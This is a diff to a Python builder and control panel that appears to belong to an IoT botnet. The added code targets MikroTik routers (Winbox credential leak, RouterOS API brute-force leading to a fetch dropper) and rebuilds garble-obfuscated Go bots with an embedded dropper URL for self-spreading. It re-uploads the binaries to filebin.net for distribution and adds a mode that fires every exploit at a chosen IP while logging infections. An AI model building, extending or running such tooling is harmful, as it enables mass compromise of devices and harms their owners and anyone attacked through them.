@@ -467,7 +467,9 @@ class Builder:
         # ── NAS / serveurs embarqués ──────────────────────────────────────────
         ('5000',  'Synology DSM    (NAS Synology panneaux admin)'),
         ('5001',  'Synology HTTPS  (NAS Synology HTTPS)'),
-        ('8291',  'Winbox MikroTik (CVE-2018-14847, leak creds)'),
+        ('2000',  'MikroTik BW     (bandwidth-test server, fingerprint Shodan -1538260461)'),
+        ('8291',  'Winbox MikroTik (CVE-2018-14847, leak creds plaintext)'),
+        ('8728',  'RouterOS API    (brute-force default admin:, puis /tool/fetch dropper)'),
         # ── Routeurs ──────────────────────────────────────────────────────────
         ('52869', 'UPnP MiniUPnPd  (CVE-2013-0229, buffer overflow)'),
         ('1900',  'UPnP SSDP UDP   (amplification + device discovery)'),
@@ -483,6 +485,7 @@ class Builder:
         'cameras': {'37777','34567','9527','60001','554','8554'},
         'iot':     {'7547','5555','9034','30005'},
         'nas':     {'5000','5001','8291'},
+        'mikrotik': {'2000','8291','8728'},
         'voip':    {'5060'},
         'upnp':    {'52869','1900','161'},
     }
@@ -951,6 +954,8 @@ class Builder:
             f'{LEGACY_DIR}/bot.ppc.legacy':    ('qemu-ppc64',   'ppc-legacy'),
         }
         import time as _time
+        import tempfile, shutil as _sh
+
         any_qemu = False
         qemu_ok: list[tuple[str,str]] = []   # (attr, binary) validés → upload autorisé
         qemu_fail: list[str] = []
@@ -959,11 +964,8 @@ class Builder:
             if not Path(binary).exists(): continue
             if not shutil.which(qemu_bin): continue
             any_qemu = True
-            # Trouver l'attr correspondant au binaire
             attr = next((a for a, b in built_bots if b == binary), None)
             try:
-                # Tester sur une copie — selfHide() déplace l'original sinon
-                import tempfile, shutil as _sh
                 tmp_bin = tempfile.mktemp(prefix='qemu_test_')
                 _sh.copy2(binary, tmp_bin)
                 os.chmod(tmp_bin, 0o755)
@@ -1179,6 +1181,38 @@ class Builder:
             if dlsh_url:
                 cprint(f"  [+] dl.sh dynamique → {dlsh_url}", C.GREEN)
                 fiber_ldf += f" -X 'main._dlShURL={dlsh_url}'"
+                # Recompiler les bots avec _dlShURL embedded → spread autonome sans fiber
+                cprint(f"\n  {C.YELLOW}[*] Recompilation bots avec _dlShURL (spread autonome)...{C.RESET}")
+                _bot_dl_ldf = ldflags_common + f" -X main._dlShURL={dlsh_url}"
+                rebuilt = []  # (attr, out_name) des binaires recompilés avec succès
+                for attr, label, goos, goarch, extra_env, out_name in ARCHS:
+                    if not getattr(self.cfg, attr): continue
+                    if not Path(out_name).exists(): continue
+                    env_vars = _base_env.copy()
+                    env_vars['GOOS'] = goos; env_vars['GOARCH'] = goarch; env_vars['CGO_ENABLED'] = '0'
+                    if _garble: env_vars['GOGARBLE'] = '*'
+                    env_vars.update(extra_env)
+                    _go = _garble_bin if _garble else _GO_BIN
+                    _args = ['-literals', '-tiny', '-seed=random'] if _garble else []
+                    cmd_r = [_go] + _args + ['build', f'-ldflags={_bot_dl_ldf}'] + _trimpath_flag + ['-o', out_name, 'bot_discord.go']
+                    r = subprocess.run(cmd_r, env=env_vars, capture_output=True, text=True, timeout=300)
+                    if r.returncode == 0:
+                        strip_elf_sections(out_name)
+                        cprint(f"  [+] {label.split()[0]:<10} rebuildé avec _dlShURL ✓", C.GREEN)
+                        rebuilt.append((attr, out_name))
+                    else:
+                        cprint(f"  [!] Rebuild {label.split()[0]} échoué", C.RED)
+
+                # Re-upload les binaires recompilés → écrase les anciens (filebin même bin ID)
+                if rebuilt:
+                    cprint(f"\n  {C.YELLOW}[*] Re-upload des binaires avec _dlShURL...{C.RESET}")
+                    new_urls = self._upload_bots(rebuilt, '1')
+                    if new_urls:
+                        # Fusionne les nouvelles URLs dans bot_urls (utilisées pour dl.sh final si fiber recompilé)
+                        bot_urls.update(new_urls)
+                        cprint(f"  {C.GREEN}[+] {len(new_urls)} binaire(s) re-uploadé(s) avec spread autonome{C.RESET}")
+                    else:
+                        cprint(f"  {C.YELLOW}[!] Re-upload échoué — binaires sur disk ont _dlShURL mais hébergeur n'a pas la MAJ{C.RESET}")
             else:
                 cprint(f"  [!] Upload dl.sh échoué — CVE exploits sans dropper", C.RED)
         fiber_original = Path('fiber.go').read_text()
@@ -1228,39 +1262,16 @@ class Builder:
             cprint(f"  {C.GREEN}[✓]{C.RESET} {c}")
         cprint(f"\n  {C.CYAN}[i] Lance le scanner depuis le menu Services → Démarrer fiber.{C.RESET}")
 
-        # ── Nettoyage des binaires uploadés (libère l'espace disque) ────────
+        # Binaires conservés dans build/ et build/legacy/
         if self.cfg.distrib_mode == 'auto' and to_upload:
-            # Demander si l'utilisateur veut garder les binaires
-            keep = cinput(f"\n  > Garder les binaires compilés dans build/ ? [o/N] : ", C.YELLOW).strip().lower() == 'o'
+            sz_total = sum(Path(b).stat().st_size for _, b in to_upload if Path(b).exists())
+            cprint(f"\n  {C.GREEN}[+] Binaires conservés ({sz_total // 1024} KB) → {BUILD_DIR}/ et {LEGACY_DIR}/{C.RESET}", C.GREEN)
 
-            if not keep:
-                cprint(f"\n  {C.YELLOW}── Nettoyage binaires uploadés ──{C.RESET}")
-                cleaned_bytes = 0
-                for _, binary in to_upload:
-                    try:
-                        p = Path(binary)
-                        if p.exists():
-                            sz = p.stat().st_size
-                            p.unlink()
-                            cleaned_bytes += sz
-                            cprint(f"  {C.YELLOW}[~]{C.RESET} Supprimé {binary} ({sz // 1024} KB)", C.RESET)
-                    except Exception:
-                        pass
-                # Supprimer aussi les répertoires build/ s'ils sont vides
-                for d in [LEGACY_DIR, BUILD_DIR]:
-                    try:
-                        dp = Path(d)
-                        if dp.exists() and not any(dp.iterdir()):
-                            dp.rmdir()
-                    except Exception:
-                        pass
-                if cleaned_bytes:
-                    cprint(f"  {C.GREEN}[+] {cleaned_bytes // 1024} KB libérés ✓{C.RESET}", C.GREEN)
-                else:
-                    cprint(f"  {C.YELLOW}[~] Rien à nettoyer{C.RESET}", C.YELLOW)
-            else:
-                sz_total = sum(Path(b).stat().st_size for _, b in to_upload if Path(b).exists())
-                cprint(f"  {C.GREEN}[+] Binaires conservés ({sz_total // 1024} KB){C.RESET}", C.GREEN)
+        # Nettoyer cache QEMU (mémoire/tmp)
+        cprint(f"\n  {C.YELLOW}── Nettoyage cache QEMU ──{C.RESET}")
+        subprocess.run(['sync'], capture_output=True)
+        subprocess.run(['sudo', 'sysctl', '-w', 'vm.drop_caches=3'], capture_output=True)
+        cprint(f"  {C.GREEN}[+] Cache QEMU purgé ✓{C.RESET}", C.GREEN)
 
         cinput("\n  > Entrée pour continuer...")
 
@@ -1399,21 +1410,25 @@ class Builder:
                 pass
             return ''
 
-        def upload_filebin(f: str) -> str:
-            # filebin.net — POST body brut avec headers filename/bin
+        # Bin ID fixe pour toute la session → permet d'overwrite après recompile
+        if not getattr(self, '_filebin_session_id', ''):
             import random, string
-            binid = ''.join(random.choices(string.ascii_lowercase + string.digits, k=12))
+            self._filebin_session_id = ''.join(random.choices(string.ascii_lowercase + string.digits, k=12))
+        _binid = self._filebin_session_id
+
+        def upload_filebin(f: str) -> str:
+            # filebin.net — bin ID fixe pour la session (overwrite possible après recompile)
             fname = Path(f).name
             out = _curl(['curl', '-s', '-X', 'POST',
                          '-H', 'Accept: application/json',
                          '-H', f'filename: {fname}',
-                         '-H', f'bin: {binid}',
+                         '-H', f'bin: {_binid}',
                          '--data-binary', f'@{f}',
-                         f'https://filebin.net/{binid}/{fname}'])
+                         f'https://filebin.net/{_binid}/{fname}'])
             try:
                 data = json.loads(out)
                 fn  = data.get('file', {}).get('filename', fname)
-                bid = data.get('bin', {}).get('id', binid)
+                bid = data.get('bin', {}).get('id', _binid)
                 sz  = data.get('file', {}).get('bytes', 0)
                 if sz == 0: return ''
                 return f'https://filebin.net/{bid}/{fn}'
@@ -1476,6 +1491,7 @@ class Builder:
             item('s', "Arrêter Telnet spreader")
             sep()
             item(5, "Voir scan en cours  (stats + logs)")
+            item('t', "Logs IP unique      (target scans live)")
             item(6, "Bots infectés       (Discord)")
             item(7, "Vérifier config     (test HTTP + Discord)")
             item('r', "Télécharger listes Rapid7 (remplace all.lst)")
@@ -1487,6 +1503,7 @@ class Builder:
                 case '3': self._stop_fiber()
                 case '4': self._stop_all()
                 case '5': self._show_scan_log()
+                case 't': self._show_target_logs()
                 case '6': self._show_bots()
                 case '7': self._check_config()
                 case '8': self._show_telnet_log()
@@ -1754,7 +1771,241 @@ class Builder:
             cprint(f"\n  {C.YELLOW}[i] Aucun scanner démarré. Lance depuis le menu Services.{C.RESET}")
 
         sep()
-        cinput("  > Entrée...")
+        cprint(f"  {C.CYAN}[l]{C.RESET} Voir en live (refresh auto)    {C.CYAN}[Entrée]{C.RESET} Retour")
+        ch = cinput("  > ", C.WHITE).strip().lower()
+        if ch == 'l':
+            self._live_logs()
+
+    def _live_logs(self):
+        """Affichage live des logs fiber — refresh toutes les 2s, q ou Ctrl+C pour quitter."""
+        import select as _select, glob as _glob, re as _re2
+
+        def _render():
+            clear(); print(BANNER)
+            header("LOGS EN LIVE  —  q + Entrée pour quitter")
+
+            # Tous les logs fiber connus
+            log_patterns = [
+                ('/tmp/fiber_*.log',        'scanner'),
+                ('/tmp/fiber_target_*.log', 'target'),
+                ('/tmp/fiber_imp_*.log',    'import'),
+                ('/tmp/fiber_idb_*.log',    'idb'),
+            ]
+            found_any = False
+            for pattern, kind in log_patterns:
+                for log_path in sorted(_glob.glob(pattern)):
+                    p = Path(log_path)
+                    if not p.exists() or p.stat().st_size == 0:
+                        continue
+                    found_any = True
+                    name = p.stem.replace('fiber_', '').replace('_', ' ')
+
+                    # Statut screen correspondant
+                    sname_guess = p.stem.replace('fiber_', '').replace('.', '_')
+                    if kind == 'scanner':
+                        running = self._screen_running(sname_guess) or self._screen_running('scanner_')
+                    else:
+                        running = self._screen_running(sname_guess) or self._screen_running(f'target_{sname_guess}')
+                    dot = f"{C.GREEN}●{C.RESET}" if running else f"{C.RED}●{C.RESET}"
+
+                    cprint(f"\n  {dot} {C.YELLOW}{name}{C.RESET}  {C.BLUE}[{kind}]{C.RESET}  {C.WHITE}{log_path}{C.RESET}")
+
+                    lines = p.read_text(errors='replace').splitlines()
+
+                    # Dernière ligne de stats si présente
+                    for l in reversed(lines):
+                        if 'Attempted:' in l and 'CVE' in l:
+                            nums = _re2.findall(r'(\w[\w ]+):\s*(\d+)', l)
+                            stats = {k.strip(): v for k, v in nums}
+                            cprint(
+                                f"  {C.CYAN}Attempted {C.WHITE}{stats.get('Attempted','?')}{C.RESET}  "
+                                f"Found {C.GREEN}{stats.get('Found','?')}{C.RESET}  "
+                                f"CVE {C.YELLOW}{stats.get('CVE Hit','?')}{C.RESET}  "
+                                f"Work {C.MAGENTA}{stats.get('CVE Work','?')}{C.RESET}  "
+                                f"Infected {C.RED}{stats.get('Infected','?')}{C.RESET}"
+                            )
+                            break
+
+                    # 6 dernières lignes colorisées
+                    for l in lines[-6:]:
+                        color = C.GREEN   if any(k in l.lower() for k in ('[+]', 'infect', 'cve work', 'hit')) \
+                           else C.MAGENTA if 'cve' in l.lower() \
+                           else C.RED     if any(k in l.lower() for k in ('[!]', 'error')) \
+                           else C.CYAN    if 'phase' in l.lower() or 'target' in l.lower() \
+                           else C.WHITE
+                        cprint(f"    {color}{l}{C.RESET}")
+
+            if not found_any:
+                cprint(f"\n  {C.YELLOW}[i] Aucun log trouvé — lance un scanner d'abord.{C.RESET}")
+
+            print(f"\n  {C.BLUE}{'─'*46}{C.RESET}")
+            print(f"  {C.CYAN}Refresh toutes les 2s  —  q + Entrée pour quitter{C.RESET}")
+
+        try:
+            while True:
+                _render()
+                # Attendre 2s avec détection touche non-bloquante
+                import sys
+                rlist, _, _ = _select.select([sys.stdin], [], [], 2.0)
+                if rlist:
+                    ch = sys.stdin.readline().strip().lower()
+                    if ch in ('q', 'quit', 'exit', '0'):
+                        break
+        except KeyboardInterrupt:
+            pass
+
+    def _show_target_logs(self):
+        """Viewer dédié aux scans IP unique — liste + live tail interactif."""
+        import glob as _glob, select as _sel, sys as _sys
+
+        def _list_targets():
+            files = sorted(_glob.glob('/tmp/fiber_target_*.log'))
+            return files
+
+        while True:
+            clear(); print(BANNER)
+            header("LOGS — IP UNIQUE (TARGET SCANS)")
+
+            files = _list_targets()
+            if not files:
+                cprint(f"\n  {C.YELLOW}[i] Aucun scan IP unique lancé pour l'instant.{C.RESET}")
+                cprint(f"  {C.CYAN}    Lance un scan via : Fiber → [9] IP unique{C.RESET}")
+                sep()
+                cinput("  > Entrée pour retour...")
+                return
+
+            # Affiche la liste des scans disponibles
+            cprint(f"\n  {'#':<4} {'IP cible':<20} {'Statut':<10} {'Lignes':>7}  {'Dernier événement'}")
+            cprint(f"  {'─'*70}")
+            for i, f in enumerate(files, 1):
+                p = Path(f)
+                ip_raw = p.stem.replace('fiber_target_', '').replace('_', '.')
+                lines  = p.read_text(errors='replace').splitlines()
+                nb     = len(lines)
+                sname  = f"target_{p.stem.replace('fiber_target_','')}"
+                alive  = self._screen_running(sname)
+                dot    = f"{C.GREEN}●{C.RESET}" if alive else f"{C.RED}●{C.RESET}"
+                last   = lines[-1].strip()[:55] if lines else '—'
+                cprint(f"  {C.CYAN}[{i}]{C.RESET} {dot} {C.YELLOW}{ip_raw:<18}{C.RESET} {nb:>5} lignes   {C.WHITE}{last}{C.RESET}")
+
+            sep()
+            cprint(f"  {C.CYAN}[n]{C.RESET} Entrer numéro pour voir le log complet en live")
+            cprint(f"  {C.CYAN}[a]{C.RESET} Tous les logs en live (multi-target)")
+            cprint(f"  {C.CYAN}[0]{C.RESET} Retour")
+            sep()
+            ch = cinput("  > Choix : ", C.WHITE).strip().lower()
+
+            if ch == '0' or ch == '':
+                return
+
+            if ch == 'a':
+                self._target_live_all(files)
+                continue
+
+            if ch.isdigit():
+                idx = int(ch) - 1
+                if 0 <= idx < len(files):
+                    self._target_live_one(files[idx])
+                continue
+
+    @staticmethod
+    def _color_target_line(line: str, prefix: str = '  ') -> None:
+        l = line.lower()
+        if any(k in l for k in ('infecté', '[+]', 'cve work', 'login réussi', 'api default')):
+            color = C.GREEN
+        elif any(k in l for k in ('phase', '[mt]', 'target scan', '═')):
+            color = C.CYAN
+        elif any(k in l for k in ('cve', 'exploit', 'winbox', 'mikrotik')):
+            color = C.MAGENTA
+        elif any(k in l for k in ('[!]', 'error', 'refusé', 'non infecté')):
+            color = C.RED
+        elif any(k in l for k in ('port', 'ouvert', 'fermé')):
+            color = C.YELLOW
+        else:
+            color = C.WHITE
+        print(f"{prefix}{color}{line}{C.RESET}")
+
+    def _target_live_one(self, log_path: str):
+        """Tail -f interactif d'un fichier log target."""
+        import select as _sel, sys as _sys
+        p = Path(log_path)
+        ip = p.stem.replace('fiber_target_', '').replace('_', '.')
+        sname = f"target_{p.stem.replace('fiber_target_','')}"
+
+        try:
+            with open(log_path, 'r', errors='replace') as f:
+                clear(); print(BANNER)
+                header(f"LOG LIVE — {ip}")
+                content = f.read()
+                for line in content.splitlines():
+                    self._color_target_line(line)
+
+                cprint(f"\n  {C.BLUE}── Live tail — q + Entrée pour quitter ──{C.RESET}")
+
+                while True:
+                    alive = self._screen_running(sname)
+                    if not alive:
+                        cprint(f"\n  {C.YELLOW}[i] Scan terminé.{C.RESET}")
+                        cinput("  > Entrée...")
+                        return
+
+                    rlist, _, _ = _sel.select([_sys.stdin, f], [], [], 1.0)
+                    if _sys.stdin in rlist:
+                        if _sys.stdin.readline().strip().lower() in ('q','0','exit'):
+                            return
+                    if f in rlist:
+                        for line in f:
+                            self._color_target_line(line.rstrip())
+        except KeyboardInterrupt:
+            pass
+
+    def _target_live_all(self, files: list):
+        """Affichage live de tous les scans IP unique en même temps."""
+        import select as _sel, sys as _sys, glob as _glob
+        handles = {}
+        try:
+            for f in files:
+                try:
+                    fh = open(f, 'r', errors='replace')
+                    fh.read()  # saute le contenu déjà lu
+                    handles[f] = fh
+                except OSError:
+                    pass
+
+            clear(); print(BANNER)
+            header("LOG LIVE — TOUS LES TARGETS")
+
+            while True:
+                # Nouveaux fichiers créés depuis l'ouverture
+                for nf in _glob.glob('/tmp/fiber_target_*.log'):
+                    if nf not in handles:
+                        try:
+                            fh = open(nf, 'r', errors='replace')
+                            fh.read()
+                            handles[nf] = fh
+                        except OSError:
+                            pass
+
+                rlist, _, _ = _sel.select(list(handles.values()) + [_sys.stdin], [], [], 1.0)
+                if _sys.stdin in rlist:
+                    if _sys.stdin.readline().strip().lower() in ('q','0','exit'):
+                        return
+                for fh in list(rlist):
+                    if fh is _sys.stdin:
+                        continue
+                    fname = fh.name
+                    ip = Path(fname).stem.replace('fiber_target_','').replace('_','.')
+                    for line in fh:
+                        l = line.rstrip()
+                        if l:
+                            prefix = f"  {C.MAGENTA}[{ip}]{C.RESET} "
+                            self._color_target_line(l, prefix=prefix)
+        except KeyboardInterrupt:
+            pass
+        finally:
+            for fh in handles.values():
+                try: fh.close()
+                except: pass
 
     def _show_bots(self):
         clear(); print(BANNER)
@@ -2010,10 +2261,11 @@ class Builder:
         cprint(f"  {C.CYAN}[6]{C.RESET} masscan + InternetDB{masscan_tag} — masscan découvre, InternetDB filtre")
         cprint(f"  {C.CYAN}[7]{C.RESET} Plage CIDR manuelle    — scanner un réseau précis (ex: 1.2.3.0/24)")
         cprint(f"  {C.CYAN}[8]{C.RESET} Importer fichier IPs   — charger une liste externe → fiber direct")
+        cprint(f"  {C.CYAN}[9]{C.RESET} IP unique              — tester tous les exploits sur une cible précise")
         cprint(f"  {C.CYAN}[0]{C.RESET} Annuler\n")
         src_choice = cinput("  > Choix : ", C.WHITE).strip()
         if src_choice == '0' or not src_choice: return
-        if src_choice not in ('1','2','3','4','5','6','7','8'):
+        if src_choice not in ('1','2','3','4','5','6','7','8','9'):
             cprint("  [!] Choix invalide.", C.RED); cinput("  > Entrée..."); return
 
         # ── Paramètres spéciaux selon mode ───────────────────────────────────
@@ -2065,6 +2317,27 @@ class Builder:
                 subprocess.run(['screen', '-dmS', f'imp_{port}', 'bash', '-c', inner])
                 cprint(f"  [+] imp_{port} démarré", C.GREEN)
             cprint(f"\n  [i] Screens actifs : screen -ls", C.CYAN)
+            cinput("  > Entrée..."); return
+
+        if src_choice == '9':
+            # ── Mode IP unique : fiber target <ip> [ports] ──────────────────────
+            target_ip = cinput("  > IP cible (ex: 192.168.1.1) : ", C.WHITE).strip()
+            if not target_ip:
+                cprint("  [!] IP vide.", C.RED); cinput("  > Entrée..."); return
+            default_ports_str = '80,8080,81,443,8443,23,7547,37215,5000,34567,9527,2000,8291,8728,5678'
+            custom = cinput(f"  > Ports [{default_ports_str}] (Entrée = défaut) : ", C.WHITE).strip()
+            ports_str = custom if custom else default_ports_str
+            log_file = f"/tmp/fiber_target_{target_ip.replace('.','_')}.log"
+            fiber_cmd = f"{env_prefix}./fiber target {target_ip} {ports_str}"
+            inner = (
+                f"echo '[*] Target scan : {target_ip}  ports: {ports_str}' | tee {log_file}; "
+                f"{fiber_cmd} 2>&1 | tee -a {log_file}; "
+                f"echo '[*] Terminé.' >> {log_file}"
+            )
+            sname = f"target_{target_ip.replace('.','_')}"
+            subprocess.run(['screen', '-dmS', sname, 'bash', '-c', inner])
+            cprint(f"\n  {C.GREEN}[+] Scan lancé → screen -r {sname}{C.RESET}", C.GREEN)
+            cprint(f"  {C.CYAN}[i] Log : tail -f {log_file}{C.RESET}", C.CYAN)
             cinput("  > Entrée..."); return
 
         total_rate = self.cfg.scan_rate or 1000
